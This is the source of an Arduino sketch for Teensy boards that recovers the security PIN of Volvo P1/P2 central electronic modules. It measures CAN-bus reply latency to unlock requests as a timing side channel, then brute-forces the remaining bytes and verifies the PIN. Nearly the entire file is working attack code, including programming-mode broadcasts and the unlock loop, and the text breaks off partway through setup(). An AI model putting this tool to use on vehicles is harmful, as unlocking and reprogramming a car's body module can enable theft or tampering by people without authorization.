/* SPDX-License-Identifier: GPL-3.0 */
/*
 * Copyright (C) 2020 Vitaly Mayatskikh <v.mayatskih@gmail.com>
 *                    Christian Molson <christian@cmolabs.org>
 *                    Mark Dapoz <md@dapoz.ca>
 *
 * This work is licensed under the terms of the GNU GPL, version 3.
 *
 * P1 tested settings:
 *        Teensy 4.0 with external CAN controllers
 *        SAMPLES = 5 Seems to work reliably
 *        CALC_BYTES = 4 does seem to work fine, 3 might be more reliable
 *        BUCKETS_PER_US 4
 *        CPU SPEED: 600MHz (default)
 *        OPTIMIZE: Fastest (default)
 * 
 * P2 tested settings:
 *        Teensy 4.0 using internal and external CAN controllers
 *        SAMPLES = 30
 *        CALC_BYTES = 3
 *        NUM_LOOPS = 1000
 *        CPU SPEED: 600MHz (default)
 *        OPTIMIZE: Fastest (default)
 *
 * MCP2515 Library: https://github.com/vtl/CAN_BUS_Shield.git
 *
 *
 * Hardware selection:
 *
 * Several hardware variants are supported:
 *
 *  - Teensy 4.x with external MPC2515 CAN bus controllers
 *  - Teensy with internal dual CAN bus controllers
 *    - Only supported on Teensy 4.x and 3.6
 *  - Teensy with internal single CAN bus controller
 *    - Only supported on Teensy 3.1, 3.2 and 3.5
 *
 * The Teensy 4.0 configuration with the external MPC2515 controller is
 * described in the provided schematic.  Selecting MPC2515_HW as the
 * hardware configuration will utilize this hardware.
 *
 * The Teensy 4.x configuration uses the built-in CAN1 and CAN2 controllers.
 * CAN1 is used for the high-speed bus and CAN2 is used for the low-speed bus.
 * To enable the sampling of the high-speed CAN bus, the CAN1 receive pin
 * (CRX1, pin 37 on 4.1, pin 25 on 4.0) must be connected to digital input 2
 * (pin 4). 
 *
 * The Teensy 3.6 configuration uses the built-in CAN0 and CAN1 controllers.
 * CAN0 is used for the high-speed bus and CAN1 is used for the low-speed bus.
 * To enable the sampling of the high-speed CAN bus, the CAN0 receive pin
 * (pin 6) must be connected to digital input 2 (pin 4).
 *
 * The Teensy 3.1, 3.2, 3.5 configuration uses the built-in CAN1 controller
 * for access to the high-speed bus.  Since only one controller is present on
 * these models, it's not possible to connect to the low-speed bus.
 * To enable the sampling of the high-speed CAN bus, the CAN receive pin
 * must be connected to digital input 2.
 *
 * If the internal controllers are selected, the FlexCAN_T4 library must be
 * available in your library (should already be present as part of Teensyduino).
 * If it is missing it can be found here: https://github.com/tonton81/FlexCAN_T4
 *
 * External transcievers must be used to connect the Teensy to the CAN bus.
 *
 * Select TEENSY_CAN_HW as the hardware configuration to use the internal
 * CAN controller.
 *
 */

/* hardware selection */

#define MCP2515_HW      1   /* Teensy with external CAN controllers */
#define TEENSY_CAN_HW   2   /* Teensy with internal CAN controller */

#define HW_SELECTION MCP2515_HW

/* tunable parameters */

#undef  PLATFORM_P1        /* P1 Platform (S40/V50/C30/C70) MC9S12xxXXX based */
#define PLATFORM_P2        /* P2 Platform (S60/S80/V70/XC70/XC90) M32C based */

#define HAS_CAN_LS          /* in the vehicle both low-speed and high-speed CAN-buses need to go into programming mode */
#define SAMPLES        30   /* number of samples per sequence, more is better (up to 100) */
#define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
#define NUM_LOOPS      1000 /* how many loops to do when calculating crack rate */

/* end of tunable parameters */

#include <stdio.h>

#if (HW_SELECTION == MCP2515_HW)
 #include <SPI.h>
 #include <mcp_can.h>
 #include <mcp_can_dfs.h>
#elif (HW_SELECTION == TEENSY_CAN_HW)
 #include <FlexCAN_T4.h>

 #if defined(__IMXRT1062__)
  #define TEENSY_MODEL_4X
 #elif defined(__MK66FX1M0__)
  #define TEENSY_MODEL_36
 #elif defined(__MK64FX512__)
  #define TEENSY_MODEL_35
 #elif defined(__MK20DX256__)
  #define TEENSY_MODEL_32
 #else
  #error Unsupported Teensy model.
 #endif

#else
 #error Hardware platform must be selected.
#endif

#if defined(PLATFORM_P2)

/* P2 platform settings: S80, V70, XC70, S60, XC90 */

#define BUCKETS_PER_US        1                    /* how many buckets per microsecond do we store (1 means 1us resolution */
#define CEM_REPLY_DELAY_US    (30*BUCKETS_PER_US)  /* minimum time in us for CEM to reply for PIN unlock command (approx) */
#define CEM_REPLY_TIMEOUT_MS  2                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
#define HISTOGRAM_DISPLAY_MIN 80                   /* minimum count for histogram display */
#define HISTOGRAM_DISPLAY_MAX 94                   /* maximum count for histogram display */

const uint32_t shuffleOrder[] = { 3, 1, 5, 0, 2, 4 };

#elif defined(PLATFORM_P1)

/* P1 platform settings: S40, V50, C30, C70 */

#define BUCKETS_PER_US        4                    /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
#define AVERAGE_DELTA_MIN     (16*BUCKETS_PER_US)  /* buckets to look at before the rolling average */
#define AVERAGE_DELTA_MAX     (32*BUCKETS_PER_US)  /* buckets to look at after the rolling average  */
#define CEM_REPLY_DELAY_US    (200*BUCKETS_PER_US) /* minimum time in us for CEM to reply for PIN unlock command (approx) */
#define CEM_REPLY_TIMEOUT_MS  2                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
#define HISTOGRAM_DISPLAY_MIN 8                    /* minimum count for histogram display (8us below average) */
#define HISTOGRAM_DISPLAY_MAX 24                   /* maximum count for histogram display (24us above average) */

#undef  DUMP_BUCKETS                               /* dump all buckets for debugging */
#define USE_ROLLING_AVERAGE                        /* use a rolling average latency for choosing measurements */ 

/* P1 processes the key in order
   The order in flash is still shuffled though
   Order in flash: 5, 2, 1, 4, 0, 3
*/

const uint32_t shuffleOrder[] = { 0, 1, 2, 3, 4, 5 };

#else
#error Platform required        /* must pick PLATFORM_P1 or PLATFORM_P2 above */
#endif

/* hardware defintions */

#if (HW_SELECTION == MCP2515_HW)

#define CAN_HS_CS_PIN 2         /* MCP2515 chip select pin CAN-HS */
#define CAN_LS_CS_PIN 3         /* MCP2515 chip select pin CAN-LS */
#define CAN_INTR_PIN  4         /* MCP2515 interrupt pin CAN-HS */
#define CAN_L_PIN    10         /* CAN-HS- wire, directly connected (CAN-HS, Low)*/

#define MCP2515_CLOCK MCP_8MHz  /* Different boards may have a different crystal, Seeed Studio is MCP_16MHZ */

MCP_CAN CAN_HS(CAN_HS_CS_PIN);
MCP_CAN CAN_LS(CAN_LS_CS_PIN);

#elif (HW_SELECTION == TEENSY_CAN_HW)

/* use FlexCAN driver */

#define CAN_L_PIN    2          /* CAN Rx pin connected to digital pin 2 */

#define CAN_500KBPS 500000      /* 500 Kbit speed */
#define CAN_125KBPS 125000      /* 125 Kbit speed */

#define CAN_HS_SPEED CAN_500KBPS
#define CAN_LS_SPEED CAN_125KBPS

/* CAN high-speed and low-speed controller objects */

#if defined(TEENSY_MODEL_4X)

/* Teensy 4.x */

FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_hs;
FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_16> can_ls;

#elif defined(TEENSY_MODEL_36)

/* Teensy 3.6 */

FlexCAN_T4<CAN0, RX_SIZE_256, TX_SIZE_16> can_hs;
FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_ls;

#elif defined(TEENSY_MODEL_35) || defined(TEENSY_MODEL_32)

/* Teensy 3.1, 3.2, 3.5 */

FlexCAN_T4<CAN0, RX_SIZE_256, TX_SIZE_16> can_hs;

/* only one CAN bus on these boards */

#undef  HAS_CAN_LS

#endif /* TEENSY_MODEL */

typedef enum {
  CAN_HS,       /* high-speed bus */
  CAN_LS        /* low-speed bus */
} can_bus_id_t;

#endif /* HW_SELECTION */

/* use the ARM cycle counter as the time-stamp */

#define TSC ARM_DWT_CYCCNT

#define CEM_REPLY_US (200 * BUCKETS_PER_US)

#define printf Serial.printf

/* CAN bus speeds to use */

#define CAN_HS_BAUD CAN_500KBPS
#define CAN_LS_BAUD CAN_125KBPS

#define CAN_MSG_SIZE    8       /* messages are always 8 bytes */

#define CEM_ECU_ID      0x50    /* P1/P2 CEM uses ECU id 0x50 in the messages */

#define PIN_LEN         6       /* a PIN has 6 bytes */

uint32_t averageReponse = 0;

/* measured latencies are stored for each of possible value of a single PIN digit */

typedef struct seq {
  uint8_t  pinValue;    /* value used for the PIN digit */
  uint32_t latency;     /* measured latency */
} sequence_t;

sequence_t sequence[100] = { 0 };

volatile bool canInterruptReceived = false;

/* assert macro for debugging */

#define assert(e) ((e) ? (void)0 : \
                         __assert__(__func__, __FILE__, __LINE__, #e))

/* Teensy function to set the core's clock rate */

extern "C" uint32_t set_arm_clock (uint32_t freq);

/* forward declarations */

void __assert__ (const char *__func, const char *__file,
                 int __lineno, const char *__sexp);
bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose);

/*******************************************************************************
 *
 * canMsgSend - send message on the CAN bus (MPC2515 version)
 *
 * Returns: N/A
 */

#if (HW_SELECTION == MCP2515_HW)
void canMsgSend (MCP_CAN &bus, uint32_t id, uint8_t *data, bool verbose)
{

#ifndef HAS_CAN_LS

  /* return if there's no low-speed CAN bus available */

  if (&bus == &CAN_LS) {
    return;
  }
#endif

  if (verbose == true) {
    printf ("---> ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
            id, data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]);
  }

  bus.sendMsgBuf (id, 1, 8, data);
}

#elif (HW_SELECTION == TEENSY_CAN_HW)

/*******************************************************************************
 *
 * canMsgSend - send message on the CAN bus (FlexCAN_T4 version)
 *
 * Returns: N/A
 */

void canMsgSend (can_bus_id_t bus, uint32_t id, uint8_t *data, bool verbose)
{
  CAN_message_t msg;

  if (verbose == true) {
      printf ("---> ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
              id, data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]);
   }

  /* prepare the message to transmit */

  msg.id = id;
  msg.len = 8;
  msg.flags.extended = 1;
  memcpy (msg.buf, data, 8);

  /* send it to the appropriate bus */

  switch (bus) {
    case CAN_HS:
      can_hs.write (msg);
      break;

#if defined(HAS_CAN_LS)
    case CAN_LS:
      can_ls.write (msg);
      break;
#endif

    default:
      break;
  }

}
#endif /* HW_SELECTION */

#if (HW_SELECTION == TEENSY_CAN_HW)

/* storage for message received via event */

CAN_message_t eventMsg;
bool eventMsgAvailable = false;

/*******************************************************************************
 *
 * canHsEvent - FlexCAN_T4's message receive call-back
 *
 * Returns: N/A
 */

void canHsEvent (const CAN_message_t &msg)
{

  /* just save the message in a global and flag it as available */

  eventMsg = msg;
  eventMsgAvailable = true;
}

#endif /* HW_SELECTION */

/*******************************************************************************
 *
 * canMsgReceive - receive a CAN bus message
 *
 * Note: always processes messages from the high-speed bus
 *
 * Returns: true if a message was available, false otherwise
 */

bool canMsgReceive (uint32_t *id, uint8_t *data, bool wait, bool verbose)
{
  uint8_t *pData;
  uint32_t canId = 0;
  bool     ret = false;

#if (HW_SELECTION == MCP2515_HW)
  uint8_t msg[CAN_MSG_SIZE] = { 0 };

  do {
    uint8_t len;

    /* poll if a message is available */

    ret = (CAN_HS.checkReceive () == CAN_MSGAVAIL);
    if (ret == true) {

      /* retrieve available message and return it */

      CAN_HS.readMsgBuf (&len, msg);
      canId = CAN_HS.getCanId ();
      pData = msg;
    }
  } while ((ret == false) && (wait == true));

#elif (HW_SELECTION == TEENSY_CAN_HW)

  do {

    /* call FlexCAN_T4's event handler to process queued messages */

    can_hs.events ();

    /* check if a message was available and process it */

    if (eventMsgAvailable == true) {

      /* process the global buffer set by can_hs.events */

      eventMsgAvailable = false;
      canId = eventMsg.id;
      pData = eventMsg.buf;
      ret = true;
    }
  } while ((ret == false) && (wait == true));

#endif /* HW_SELECTION */

  /* no message, just return an error */

  if (ret == false) {
    return ret;
  }

  /* save data to the caller if they provided buffers */

  if (id != NULL) {
    *id = canId;
  }

  if (data != NULL) {
    memcpy (data, pData, CAN_MSG_SIZE);
  }

  /* print the message we received */

  if (verbose == true) {
    printf ("<--- ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
            canId, pData[0], pData[1], pData[2], pData[3], pData[4], pData[5], pData[6], pData[7]);
  }

  return ret;
}

/*******************************************************************************
 *
 * binToBcd - convert an 8-bit value to a binary coded decimal value
 *
 * Returns: converted 8-bit BCD value
 */

uint8_t binToBcd (uint8_t value)
{
  return ((value / 10) << 4) | (value % 10);
}

/*******************************************************************************
 *
 * bcdToBin - convert a binary coded decimal value to an 8-bit value
 *
 * Returns: converted 8-bit binary value
 */

uint8_t bcdToBin (uint8_t value)
{
  return ((value >> 4) * 10) + (value & 0xf);
}

/*******************************************************************************
 *
 * profileCemResponse - profile the CEM's response to PIN requests
 *
 * Returns: number of PINs processed per second
 */

uint32_t profileCemResponse (void)
{
  uint8_t  pin[PIN_LEN] = { 0 };
  uint32_t start;
  uint32_t end;
  uint32_t latency;
  uint32_t rate;
  bool     verbose = false;

  averageReponse = 0;

  /* start time in milliseconds */

  start = millis ();

  /* collect the samples */

  for (uint32_t i = 0; i < NUM_LOOPS; i++) {

    /* average calculation is more reliable using random PIN digits */

    pin[0] = random (0, 255); 

    /* try and unlock the CEM with the random PIN */

    cemUnlock (pin, NULL, &latency, verbose);

    /* keep a running total of the average latency */

    averageReponse += latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);
  }

  /* end time in milliseconds */

  end = millis ();

  /* calculate the average latency for a single response */

  averageReponse = averageReponse / NUM_LOOPS;

  /* number of PINs processed per second */

  rate = 1000 * NUM_LOOPS / (end - start);

  printf ("%u pins in %u ms, %u pins/s, average response: %u\n", NUM_LOOPS, (end - start), rate, averageReponse);

  return rate;
}

/*******************************************************************************
 *
 * canInterruptHandler - CAN controller interrupt handler
 *
 * Returns: N/A
 */

void canInterruptHandler (void)
{

  /* we're only interested if the interrupt was received */

  canInterruptReceived = true;
}

/*******************************************************************************
 *
 * cemUnlock - attempt to unlock the CEM with the provided PIN
 *
 * Returns: true if the CEM was unlocked, false otherwise
 */

bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
{
  uint8_t  unlockMsg[CAN_MSG_SIZE] = { CEM_ECU_ID, 0xBE };
  uint8_t  reply[CAN_MSG_SIZE];
  uint8_t *pMsgPin = unlockMsg + 2;
  uint32_t start, end, limit;
  uint32_t id;
  uint32_t sampleCount;
  uint32_t maxSample = 0;
  uint32_t maxTime = 0;
  bool     replyWait = true;

  /* shuffle the PIN and set it in the request message */

  pMsgPin[shuffleOrder[0]] = pin[0];
  pMsgPin[shuffleOrder[1]] = pin[1];
  pMsgPin[shuffleOrder[2]] = pin[2];
  pMsgPin[shuffleOrder[3]] = pin[3];
  pMsgPin[shuffleOrder[4]] = pin[4];
  pMsgPin[shuffleOrder[5]] = pin[5];

  /* send the unlock request */

  canMsgSend (CAN_HS, 0xffffe, unlockMsg, verbose);

  /* clear current interrupt status */

  canInterruptReceived = false;

  /* maximum time to collect our samples */

  limit = millis () + CEM_REPLY_TIMEOUT_MS;

  /*
   * Sample the CAN bus and determine the longest time between bit transitions.
   *
   * The measurement is done in parallel with the CAN controller transmitting the
   * CEM unlock message.  The longest time will occur between the end of message
   * transmission (acknowledge slot bit) of the current message and the start of
   * frame bit of the CEM's reply.
   *
   * The sampling terminates when any of the following conditions occurs:
   *  - the CAN controller generates an interrupt from a received message
   *  - a measured time between bits is greater than the expected CEM reply time
   *  - a timeout occurs due to no bus activity
   */

  for (sampleCount = 0, start = TSC;
      (canInterruptReceived == false) && 
      (millis () < limit) &&
      (maxTime < CEM_REPLY_DELAY_US * clockCyclesPerMicrosecond ());) {

    /* if the line is high, the CAN bus is either idle or transmitting a bit */

    if (digitalRead (CAN_L_PIN) == 1) {

      /* count how many times we've seen the bus in a "1" state */

      sampleCount++;
      continue;
    }

    /* the CAN bus isn't idle, it's the start of the next bit */

    end = TSC;

    /* we only need to track the longest time we've seen */

    if (sampleCount > maxSample) {
      maxSample = sampleCount;
      sampleCount = 0;

      /* track the time in clock cycles */

      maxTime = end - start;
    }

    /* wait for the current transmission to finish before sampling again */

    while (digitalRead (CAN_L_PIN) == 0) {

      /* abort if we've hit our timeout */

      if (millis () >= limit) {
        break;
      }
    }

    /* start of the next sample */

    start = TSC;
  }

  /* check for a timeout condition */

  if (millis () >= limit) {
    printf ("Timeout waiting for CEM reply!\n");

    /* on a timeout, try and see if there is anything in the CAN Rx queue */

    replyWait = false;
  }

  /* default reply is set to indicate a failure */

  memset (reply, 0, sizeof(reply));
  reply[2] = 0xff;

  /* see if anything came back from the CEM */

  (void) canMsgReceive (&id, reply, replyWait, false);

  /* return the maximum time between transmissions that we saw on the CAN bus */

  if (latency != NULL) {
    *latency = maxTime;
  }

  /* return PIN used if the caller wants it */

  if (pinUsed != NULL) {
    memcpy (pinUsed, pMsgPin, PIN_LEN);
  }

  /* a reply of 0x00 indicates CEM was unlocked */

  return reply[2] == 0x00;
}

/*******************************************************************************
 *
 * ecuPrintPartNumber - read an ECU's hardware part number
 *
 * Returns: N/A
 */

void ecuPrintPartNumber (uint8_t ecuId)
{
  uint32_t id;
  uint8_t  data[CAN_MSG_SIZE] = { 0xff, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  bool     verbose = true;

  printf ("Reading part number from ECU 0x%02x\n", ecuId);

  /* set the ECU id in the message */

  data[0] = ecuId;

  /* send the message */

  canMsgSend (CAN_HS, 0xffffe, data, verbose);

  /* get the reply */

  memset (data, 0, sizeof(data));
  (void) canMsgReceive (&id, data, true, verbose);

  printf ("Part Number: %02u%02u%02u%02u%02u%02u\n",
          bcdToBin (data[2]), bcdToBin (data[3]),
          bcdToBin (data[4]), bcdToBin (data[5]),
          bcdToBin (data[6]), bcdToBin (data[7]));
}

/*******************************************************************************
 *
 * progModeOn - put all ECUs into programming mode
 *
 * Returns: N/A
 */

void progModeOn (void)
{
  uint8_t  data[CAN_MSG_SIZE] = { 0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  uint32_t time = 5000;
  uint32_t delayTime = 5;
  bool     verbose = true;

  printf ("Putting all ECUs into programming mode.\n");

  /* broadcast a series of PROG mode requests */

  while (time > 0) {
    canMsgSend (CAN_HS, 0xffffe, data, verbose);
    canMsgSend (CAN_LS, 0xffffe, data, verbose);

    verbose = false;
    time -= delayTime;
    delay (delayTime);
  }
}

/*******************************************************************************
 *
 * progModeOff - reset all ECUs to get them out of programming mode
 *
 * Returns: N/A
 */

void progModeOff (void)
{
  uint8_t data[CAN_MSG_SIZE] = { 0xFF, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  bool    verbose = true;

  printf ("Resetting all ECUs.\n");

  /* broadcast a series of reset requests */

  for (uint32_t i = 0; i < 50; i++) {
    canMsgSend (CAN_HS, 0xffffe, data, verbose);
    canMsgSend (CAN_LS, 0xffffe, data, verbose);

    verbose = false;
    delay (100);
  }
}

/*******************************************************************************
 *
 * seq_max - quicksort comparison function to find highest latency
 *
 * Returns: integer less than zero, zero or greater than zero
 */

int seq_max (const void *a, const void *b)
{
  sequence_t *_a = (sequence_t *)a;
  sequence_t *_b = (sequence_t *)b;

  return _b->latency - _a->latency;
}

/*******************************************************************************
 *
 * crackPinPosition - attempt to find a specific digit in the PIN 
 *
 * Returns: N/A
 */

void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
{
  uint32_t histogram[CEM_REPLY_US];
  uint32_t latency;
  uint32_t prod;
  uint32_t sum;
  uint8_t  pin1;
  uint8_t  pin2;
  uint32_t i;
  uint32_t k;

  /* we process three digits in this code */

  assert (pos <= (PIN_LEN - 3));

  /* clear collected latencies */

  memset (sequence, 0, sizeof(sequence));

  /* iterate over all possible values for the PIN digit */

  for (pin1 = 0; pin1 < 100; pin1++) {

    /* set PIN digit */

    pin[pos] = binToBcd (pin1);

    /* print a progress message for each PIN digit we're processing */

    printf ("[ ");

    /* show numerial values for the known digits */

    for (i=0; i <= pos; i++) {
      printf ("%02x ", pin[i]);
    }

    /* placeholder for the unknown digits */

    while (i < PIN_LEN) {
      printf ("-- ");
      i++;
    }

    printf ("]: ");

    /* clear histogram data for the new PIN digit */

    memset (histogram, 0, sizeof(histogram));

    /* iterate over all possible values for the adjacent PIN digit */

    for (pin2 = 0; pin2 < 100; pin2++) {

      /* set PIN digit */

      pin[pos + 1] = binToBcd (pin2);

      /* collect latency measurements the PIN pair */

      for (uint32_t j = 0; j < SAMPLES; j++) {

        /* iterate the next PIN digit (third digit) */

        pin[pos + 2] = binToBcd ((uint8_t)(j & 0xff));

        /* try and unlock and measure the latency */

        cemUnlock (pin, NULL, &latency, verbose);

        /* calculate the index into the historgram */

        uint32_t idx = latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);

        if (idx >= CEM_REPLY_US) {
          idx = CEM_REPLY_US - 1;
        }

        /* bump the count for this latency */

        histogram[idx]++;
      }
    }

    /* clear the digits we just used for latency iteration */

    pin[pos + 1] = 0;
    pin[pos + 2] = 0;

    /* clear statistical values we're calculating */

    prod = 0;
    sum  = 0;

#if defined(PLATFORM_P2)

    /* loop over the histogram values */

    for (k = 0; k < CEM_REPLY_US; k++) {

      /* print the latency histogram for relevant values */

      if ((k >= HISTOGRAM_DISPLAY_MIN) &&
          (k <= HISTOGRAM_DISPLAY_MAX)) {
        printf ("%03u ", histogram[k]);
      }

      /* produce a weighted count of all entries */

      prod += histogram[k] * k;
      sum  += histogram[k];
    }

    printf (": %u\n", prod);

    /* store the weighted count for this PIN value */

    sequence[pin1].pinValue = pin[pos];
    sequence[pin1].latency  = prod;

#elif defined(PLATFORM_P1)

    /* dump buckets for debug purposes */

#if defined(DUMP_BUCKETS)
    printf ("Average latency: %u\n", averageReponse);

    for (k=0; k < CEM_REPLY_US; k++) {
      if (histogram[k] != 0) {
        printf ("%4u : %5u\n", k, histogram[k]);
      }
    }
#endif

    /* make sure the value for averageReponse is appropriate */

    assert (averageReponse >= AVERAGE_DELTA_MIN);
    assert (averageReponse < CEM_REPLY_US);

    /* loop over the histogram values */

#if defined(USE_ROLLING_AVERAGE)

    /* selective use values based on average latency */

    for (k = (averageReponse - AVERAGE_DELTA_MIN);
         k < (averageReponse + AVERAGE_DELTA_MAX);
         k++) {
#else

    /* use all values collected */

    for (k = 0; k < CEM_REPLY_US; k++) {
#endif

      /* verify limit in case parameters are wrong */

      if (k > CEM_REPLY_US) {
        continue;
      }

      /* print the latency histogram for relevant values */

      if ((k > (averageReponse - HISTOGRAM_DISPLAY_MIN)) &&
          (k < (averageReponse + HISTOGRAM_DISPLAY_MAX))) {
        printf ("%03u ", histogram[k]);
      }

      /* calculate weighted count and total of all entries */

      prod += histogram[k] * k;
      sum  += histogram[k];
    }

    /* weighted average */

#if defined(USE_ROLLING_AVERAGE)
    prod = prod / sum; 
#endif

    printf (": %u\n", prod);

    /* store the weighted average count for this PIN value */

    sequence[pin1].pinValue = pin[pos];
    sequence[pin1].latency  = prod;

#endif /* PLATFORM */

  }

  /* sort the collected sequence of latencies */

  qsort (sequence, 100, sizeof(sequence_t), seq_max);

  /* print the top 25 latencies and their PIN value */

  for (uint32_t i = 0; i < 25; i++) {
    printf ("%u: %02x = %u\n", i, sequence[i].pinValue, sequence[i].latency);
  }

#if defined(USE_ROLLING_AVERAGE)
  /* update the average latency for the next measurement */

  averageReponse = sequence[0].latency;
#endif

  /* choose the PIN value that has the highest latency */

  printf ("pin[%u] candidate: %02x with latency %u\n", pos, sequence[0].pinValue, sequence[0].latency);

  /* print a warning message if the top two are close, we might be wrong */

#if defined(PLATFORM_P2)

  if ((sequence[0].latency - sequence[1].latency) < clockCyclesPerMicrosecond ()) {
    printf ("Warning: Selected candidate is very close to the next candidate!\n");
    printf ("         Selection may be incorrect.\n");
  }

#endif

  /* set the digit in the overall PIN */

  pin[pos] = sequence[0].pinValue;
  pin[pos + 1] = 0;
}

/*******************************************************************************
 *
 * cemCrackPin - attempt to find the specified number of bytes in the CEM's PIN
 *
 * Returns: N/A
 */

void cemCrackPin (uint32_t maxBytes, bool verbose)
{
  uint8_t  pin[PIN_LEN];
  uint8_t  pinUsed[PIN_LEN];
  uint32_t start;
  uint32_t end;
  uint32_t percent = 0;
  uint32_t percent_5;
  uint32_t crackRate;
  uint32_t remainingBytes;
  bool     cracked = false;
  uint32_t i;

  printf ("Calculating bytes 0-%u\n", maxBytes - 1);

  /* profile the CEM to see how fast it can process requests */

  crackRate = profileCemResponse ();

  /* start time */

  start = millis ();

  /* set the PIN to all zeros */

  memset (pin, 0, sizeof(pin));

  /* try and crack each PIN position */

  for (uint32_t i = 0; i < maxBytes; i++) {
    crackPinPosition (pin, i, verbose);
  }

  /* number of PIN bytes remaining to find */

  remainingBytes = PIN_LEN - maxBytes,

  /* show the result of the cracking */

  printf ("Candidate PIN ");

  /* show numerial values for the known digits */

  for (i=0; i < maxBytes; i++) {
    printf ("0x%02x ", pin[i]);
  }

  /* placeholder for the remaining digits */

  while (i < PIN_LEN) {
    printf ("-- ");
    i++;
  }

  printf (": brute forcing bytes %u to %u (%u bytes), will take up to %u seconds\n",
          maxBytes, PIN_LEN - 1, remainingBytes,
          (uint32_t)(pow (100, remainingBytes) / crackRate));

  /* 5% of the remaining PINs to try */

  percent_5 = pow (100, (remainingBytes))/20;

  printf ("Progress: ");

  /*
   * Iterate for each of the remaining PIN bytes.
   * Each byte has a value 0-99 so we iterare for 100^remainingBytes values
   */

  for (i = 0; i < pow (100, (remainingBytes)); i++) {
    uint32_t pinValues = i;

    /* fill in each of the remaining PIN values */

    for (uint32_t j = maxBytes; j < PIN_LEN; j++) {
      pin[j] = binToBcd (pinValues % 100);

      /* shift to the next PIN's value */

      pinValues /= 100;
    }

    /* try and unlock with this PIN */

    if (cemUnlock (pin, pinUsed, NULL, verbose)) {

      /* the PIN worked, print it and terminate the search */

      printf ("done\n");
      printf ("\nfound PIN: 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x",
              pinUsed[0], pinUsed[1], pinUsed[2], pinUsed[3], pinUsed[4], pinUsed[5]);

      cracked = true;
      break;
    }

    /* print a periodic progress message */

    if ((i % percent_5) == 0) {
      printf ("%u%%..", percent * 5);
      percent++;
    }
  }

  /* print execution summary */

  end = millis ();
  printf ("\nPIN is %scracked in %3.2f seconds\n", cracked ? "" : "NOT ", (end - start) / 1000.0);

  /* validate the PIN if we were able to crack it */

  if (cracked == true) {

    uint8_t data[CAN_MSG_SIZE];
    uint32_t can_id = 0;

    printf ("Validating PIN\n");

    /* send the unlock request to the CEM */

    data[0] = CEM_ECU_ID;
    data[1] = 0xBE;
    data[2] = pinUsed[0];
    data[3] = pinUsed[1];
    data[4] = pinUsed[2];
    data[5] = pinUsed[3];
    data[6] = pinUsed[4];
    data[7] = pinUsed[5];

    canMsgSend (CAN_HS, 0xffffe, data, verbose);

    /* get the response from the CEM */

    memset (data, 0, sizeof(data));

    (void) canMsgReceive (&can_id, data, true, false);

    /* verify the response came from the CEM and is a successful reply to our request */

    if ((can_id == 3) &&
      (data[0] == CEM_ECU_ID) && (data[1] == 0xB9) && (data[2] == 0x00)) {
      printf ("PIN verified.\n");
    } else {
      printf ("PIN verification failed!\n");
    }
  }

  printf ("done\n");
}

#if (HW_SELECTION == MCP2515_HW)

/*******************************************************************************
 *
 * mcp2515Init - initialize MCP2515 external CAN controllers
 *
 * Returns: N/A
 */

void mcp2515Init (void)
{
  printf ("CAN_HS init\n");

  while (MCP2515_OK != CAN_HS.begin (CAN_HS_BAUD, MCP2515_CLOCK)) {
    delay (1000);
  }

  pinMode (CAN_INTR_PIN, INPUT);
  pinMode (CAN_INTR_PIN, INPUT_PULLUP);
  attachInterrupt (digitalPinToInterrupt (CAN_INTR_PIN), canInterruptHandler, FALLING);

#ifdef HAS_CAN_LS
  printf ("CAN_LS init\n");
  while (MCP2515_OK != CAN_LS.begin (CAN_LS_BAUD, MCP_8MHz)) {
    delay (1000);
  }
#endif
}

#elif (HW_SELECTION == TEENSY_CAN_HW)

/*******************************************************************************
 *
 * flexCanInit - initialize Teensy internal CAN controllers
 *
 * Returns: N/A
 */

void flexCanInit (void)
{

  /* high-speed CAN bus initialization */

  can_hs.begin ();
  can_hs.setBaudRate (CAN_HS_SPEED);
  can_hs.enableFIFO();
  can_hs.enableFIFOInterrupt ();
  can_hs.setFIFOFilter (ACCEPT_ALL);
  can_hs.onReceive (canHsEvent);
  printf ("CAN high-speed init done.\n");

#if defined(SHOW_CAN_STATUS)
  can_hs.mailboxStatus ();
#endif

  /* low-speed CAN bus initialization */

#if defined(HAS_CAN_LS)
  can_ls.begin ();
  can_ls.setBaudRate (CAN_LS_SPEED);
  can_ls.enableFIFO();
  printf ("CAN low-speed init done.\n");

#if defined(SHOW_CAN_STATUS)
  can_ls.mailboxStatus ();
#endif
#endif

  /* enable the time stamp counter */

  ARM_DEMCR |= ARM_DEMCR_TRCENA;
  ARM_DWT_CTRL |= ARM_DWT_CTRL_CYCCNTENA;
}

/*******************************************************************************
 *
 * ext_output1 - called by FlexCAN_T4's receive interrupt handler
 *
 * Returns: N/A
 */

void ext_output1 (const CAN_message_t &msg)
{
  canInterruptHandler ();
}

#endif /* HW_SELECTION */

/*******************************************************************************
 *
 * __assert__ - support function for assert() macro
 *
 * Returns: N/A
 */

void __assert__ (const char *__func, const char *__file,
                 int __lineno, const char *__sexp) {

  /* print an informational message about the assertion */

  printf ("Failed assertion '%s' in %s() line %d.",
          __sexp, __func, __lineno);

  /* halt execution */

  while (1);
}

/*******************************************************************************
 *
 * setup - Arduino entry point for hardware configuration
 *
 * Returns: N/A
 */

void setup (void)
{
  /* set up the serial port */

  Serial.begin (115200);
  delay (3000);

  /* set up the pin for sampling the CAN bus */

  pinMode (CAN_L_PIN, INPUT_PULLUP);
